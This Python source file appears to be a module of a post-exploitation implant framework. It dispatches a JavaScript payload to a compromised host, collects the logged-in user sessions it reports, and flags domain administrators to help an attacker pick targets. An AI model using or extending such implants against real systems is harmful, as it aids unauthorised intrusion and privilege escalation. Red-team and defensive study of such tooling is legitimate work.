import core.implant

class EnumUsersJob(core.job.Job):

    def create(self):
        self.users = []

    def report(self, handler, data, sanitize = False):
        user = data.decode()
        handler.reply(200)

        if user == "Complete":
            super(EnumUsersJob, self).report(handler, data, False)

        if user.lower() not in [u.lower() for u in self.users]:
            self.users.append(user)

    def done(self):

        if self.shell.domain_info:
            all_domain_admins = [da for das in [[k[0].lower()+"\\"+da.lower(), k[1].lower()+"\\"+da.lower()] for k in self.shell.domain_info for da in self.shell.domain_info[k]["Domain Admins"]] for da in das]
            self.users = [user+"*" if user.lower() in all_domain_admins else user for user in self.users]

        header = "Logged in users on "+self.ip
        self.results = "\n\n"+header+"\n"+"="*len(header)+"\n"
        self.results += "\n".join(self.users)
        self.results += "\n"

        self.display()

    def display(self):
        self.print_good(self.results)


class EnumUsersImplant(core.implant.Implant):

    NAME = "Enum Users"
    DESCRIPTION = "Enumerates user sessions on the target system."
    AUTHORS = ["zerosum0x0", "TheNaterz"]
    STATE = "implant/gather/enum_users"

    def load(self):
        pass

    def job(self):
        return EnumUsersJob

    def run(self):
        payloads = {}
        payloads["js"] = "data/implant/gather/enum_users.js"

        self.dispatch(payloads, self.job)
